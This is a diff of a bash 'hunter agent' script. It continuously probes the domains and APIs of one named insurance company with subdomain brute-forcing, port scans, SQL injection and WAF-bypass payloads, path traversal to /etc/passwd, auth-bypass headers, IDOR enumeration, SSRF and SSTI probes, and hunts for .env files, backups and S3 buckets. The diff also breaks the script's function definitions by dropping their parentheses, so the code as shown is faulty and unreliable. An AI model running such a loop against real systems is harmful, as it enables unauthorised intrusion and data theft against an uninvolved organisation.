@@ -1,7 +1,7 @@
 #!/bin/bash
 # ==============================================================
-# LOSTSEC HUNTER AGENT v3
-# Full recon pipeline: LostSec methodology + continuous probing
+# Community HUNTER AGENT v3
+# Full recon pipeline: Community methodology + continuous probing
 # Integrates: subfinder, chaos, crt.sh, httpx, naabu, nmap,
 #             nuclei, ffuf, gau, wayback, alienvault, shodan
 # ==============================================================
@@ -11,9 +11,9 @@ INBOX="/tmp/agent_inbox"
 mkdir -p "$OUTDIR" "$INBOX"
 
 C=0
-log() { echo "[$(date +%H:%M:%S)] $*" >> /tmp/lostsec_hunter.log; }
+log { echo "[$(date +%H:%M:%S)] $*" >> /tmp/hunter_agent.log; }
 
-save() {
+save {
     local TITLE="$1" SEV="$2" BODY="$3"
     local TS=$(date +%Y%m%d_%H%M%S)
     local NAME=$(echo "$TITLE" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c1-40)
@@ -33,8 +33,8 @@ EOF
     log "SAVED [${SEV}] ${TITLE}"
 }
 
-clean() { tr -d '\0\a\b\f\r' | head -c 500 | tr '\n' ' ' | sed 's/  */ /g'; }
-cb() { curl -sk --max-time 8 "$@"; }
+clean { tr -d '\0\a\b\f\r' | head -c 500 | tr '\n' ' ' | sed 's/  */ /g'; }
+cb { curl -sk --max-time 8 "$@"; }
 
 # ---- TARGETS (Acko primary) ----
 P="https://partner-portal.corp.acko.com"
@@ -49,20 +49,20 @@ LD="https://lead360.corp.acko.com"
 API="https://api.acko.com"
 PA="$P/artemis-api"
 
-log "=== LOSTSEC HUNTER v3 STARTED ==="
-log "Method: LostSec full recon pipeline + continuous probing"
+log "=== Community HUNTER v3 STARTED ==="
+log "Method: Community full recon pipeline + continuous probing"
 
 while true; do
     C=$((C+1))
     log "=== Cycle $C ==="
 
     # ==============================================================
-    # PHASE 1: LOSTSEC PASSIVE RECON (every 10 cycles)
+    # PHASE 1: Community PASSIVE RECON (every 10 cycles)
     # ==============================================================
     if [ $((C % 10)) -eq 1 ]; then
         log "Phase 1: Passive recon - CT logs + subdomain discovery"
-        
-        # LostSec Step: crt.sh certificate transparency
+
+        # Community Step: crt.sh certificate transparency
         for DOM in "acko.com" "corp.acko.com"; do
             crt=$(curl -sk "https://crt.sh/?q=%25.${DOM}&output=json" 2>/dev/null)
             if [ -n "$crt" ]; then
@@ -72,7 +72,7 @@ while true; do
             fi
         done
 
-        # LostSec Step: passive URL collection (gau + wayback)
+        # Community Step: passive URL collection (gau + wayback)
         for DOM in "acko.com" "corp.acko.com" "ackodev.com"; do
             gau "$DOM" 2>/dev/null >> /tmp/gau_urls.txt
             waybackurls "$DOM" 2>/dev/null >> /tmp/wayback_urls.txt
@@ -83,12 +83,12 @@ while true; do
     fi
 
     # ==============================================================
-    # PHASE 2: LOSTSEC ACTIVE RECON (every 5 cycles)
+    # PHASE 2: Community ACTIVE RECON (every 5 cycles)
     # ==============================================================
     if [ $((C % 5)) -eq 1 ]; then
         log "Phase 2: Active recon - new subdomain brute-force + port scan"
-        
-        # LostSec Step: subdomain brute-force (FFUF) + CT combined
+
+        # Community Step: subdomain brute-force (FFUF) + CT combined
         for DOM in "acko.com" "corp.acko.com"; do
             for SUB in admin api app cdn dev docs email files ftp git \
                        internal kibana logs mail mfa monitor portal prod \
@@ -103,7 +103,7 @@ while true; do
             done
         done
 
-        # LostSec Step: naabu port scan + nmap vuln script
+        # Community Step: naabu port scan + nmap vuln script
         if command -v naabu &>/dev/null; then
             naabu -l /tmp/live_hosts.txt -top-ports 1000 -silent 2>/dev/null | \
                 while read line; do
@@ -115,7 +115,7 @@ while true; do
     fi
 
     # ==============================================================
-    # PHASE 3: LOSTSEC CONTINUOUS PROBING (EVERY CYCLE)
+    # PHASE 3: Community CONTINUOUS PROBING (EVERY CYCLE)
     # ==============================================================
 
     # 3a: All known API endpoints - HTTP status + response analysis
@@ -145,7 +145,7 @@ while true; do
             save "EP_STATUS_$(echo $EP | tr '/' '_')" "Info" "HTTP $S | $B"
     done
 
-    # 3b: LostSec - Spring Boot Actuator deep scan
+    # 3b: Community - Spring Boot Actuator deep scan
     for ACT in "/actuator" "/actuator/health" "/actuator/info" \
                "/actuator/metrics" "/actuator/mappings" "/actuator/beans" \
                "/actuator/configprops" "/actuator/env" "/actuator/loggers" \
@@ -163,7 +163,7 @@ while true; do
         done
     done
 
-    # 3c: LostSec - HTTP method bypass (PUT/PATCH/DELETE)
+    # 3c: Community - HTTP method bypass (PUT/PATCH/DELETE)
     for EP in "/internal/communications/query" \
               "/internal/bulk-operations/history" \
               "/document/1" \
@@ -180,7 +180,7 @@ while true; do
         done
     done
 
-    # 3d: LostSec - SQLi probes (with WAF bypass techniques)
+    # 3d: Community - SQLi probes (with WAF bypass techniques)
     for SQLPAYLOAD in "'" "%27" "';" "' OR '1'='1" "' OR 1=1--" \
                      "' UNION SELECT NULL--" "' AND 1=1--" \
                      "\" OR \"1\"=\"1" "1' ORDER BY 1--" \
@@ -196,7 +196,7 @@ while true; do
         done
     done
 
-    # 3e: LostSec - Path traversal (LFI)
+    # 3e: Community - Path traversal (LFI)
     for TRAV in "../" "..%2f" "%2e%2e%2f" "....//....//" \
                 "..\\" "..%5c" "%2e%2e%5c"; do
         for EP in "/document/${TRAV}etc/passwd" \
@@ -210,7 +210,7 @@ while true; do
         done
     done
 
-    # 3f: LostSec - CORS misconfiguration check
+    # 3f: Community - CORS misconfiguration check
     for T in $P $C2 $CIT $COV $AUTH $VEN $FLT $CX $LD $API; do
         H=$(cb -I -H "Origin: https://evil.com" \
                  -H "Access-Control-Request-Method: GET" \
@@ -224,7 +224,7 @@ while true; do
             save "CORS_CREDENTIALS_$(echo $T | sed 's|https://||;s|/||')" "High" "Credentials allowed with CORS"
     done
 
-    # 3g: LostSec - SSTI probes
+    # 3g: Community - SSTI probes
     for SSTI in '{{7*7}}' '#{7*7}' '${{7*7}}' '<%=7*7%>' \
                 '${7*7}' '{{7*7}}' '*{7*7}' '{{config}}'; do
         S=$(cb -X POST -w "%{http_code}" -o /tmp/h_ssti.txt \
@@ -236,7 +236,7 @@ while true; do
             save "SSTI_$(echo $SSTI | tr -d '{}' | tr -d '$#<%=')" "Critical" "Template injection | Payload: $SSTI | $B"
     done
 
-    # 3h: LostSec - SSRF probes
+    # 3h: Community - SSRF probes
     for CBEP in "/partnership/communication/callback" \
                 "/partnership/communication/v1/test/callback" \
                 "/partnership/validate_vpa"; do
@@ -255,7 +255,7 @@ while true; do
         done
     done
 
-    # 3i: LostSec - Config/Backup file discovery
+    # 3i: Community - Config/Backup file discovery
     for BAK in ".env" ".env.bak" ".env.backup" ".env.prod" ".env.dev" \
                "config.json" "config.json.bak" "config.backup" \
                "dump.sql" "backup.sql" "db.sql" "database.sql" \
@@ -275,7 +275,7 @@ while true; do
         done
     done
 
-    # 3j: LostSec - Auth bypass techniques
+    # 3j: Community - Auth bypass techniques
     for HEAD in "Authorization: Bearer" \
                 "Authorization: Bearer null" \
                 "Authorization: Bearer undefined" \
@@ -309,7 +309,7 @@ while true; do
         done
     done
 
-    # 3k: LostSec - Object reference / IDOR scanning
+    # 3k: Community - Object reference / IDOR scanning
     for ID in 1 2 3 100 500 1000 5000 9999 99999 123456 9999999; do
         for EP in "/document/${ID}" \
                   "/internal/fetch-file-status?file_id=${ID}" \
@@ -321,7 +321,7 @@ while true; do
         done
     done
 
-    # 3l: LostSec - GraphQL introspection + query discovery
+    # 3l: Community - GraphQL introspection + query discovery
     for GQL_EP in "/graphql" "/v1/graphql" "/api/graphql" "/gql" "/query"; do
         for T in $PA $C2 $CIT $VEN $API; do
             # Introspection query
@@ -335,7 +335,7 @@ while true; do
         done
     done
 
-    # 3m: LostSec - S3 bucket / presigned URL analysis
+    # 3m: Community - S3 bucket / presigned URL analysis
     for BUCKET in "acko" "acko-backups" "acko-data" "acko-partners" \
                   "acko-docs" "acko-assets" "acko-media" "acko-logs"; do
         for DOMAIN in "s3.amazonaws.com" "s3.ap-south-1.amazonaws.com"; do
@@ -345,7 +345,7 @@ while true; do
         done
     done
 
-    # 3n: LostSec - JS file endpoint discovery + secret scanning
+    # 3n: Community - JS file endpoint discovery + secret scanning
     grep -oP 'https?://[^"'"'"' ]+\.js([?#][^"'"'"' ]*)?' /tmp/h_ep.txt /tmp/h_met.txt 2>/dev/null | \
         sort -u > /tmp/js_candidates.txt
     while read -r JSURL; do
@@ -360,7 +360,7 @@ while true; do
             while read -r APIURL; do save "API_ENDPOINT_IN_JS" "Info" "Found endpoint: $APIURL in $JSURL"; done
     done < /tmp/js_candidates.txt 2>/dev/null
 
-    # 3o: LostSec - GF pattern based vulnerability classification
+    # 3o: Community - GF pattern based vulnerability classification
     if [ -f /tmp/passive_params.txt ]; then
         grep -E "(redirect|return|next|url|link|href|action|dest|destination)" /tmp/passive_params.txt 2>/dev/null | \
             head -20 | while read -r line; do save "OPEN_REDIRECT_PARAM" "Medium" "Potential open redirect param: $line"; done
@@ -374,6 +374,6 @@ while true; do
     count=$(ls "$OUTDIR"/*.md 2>/dev/null | wc -l)
     inbox_count=$(ls "$INBOX"/*.md 2>/dev/null | wc -l)
     log "Cycle $C done | $count total findings | $inbox_count awaiting verification"
-    
+
     sleep 45
 done
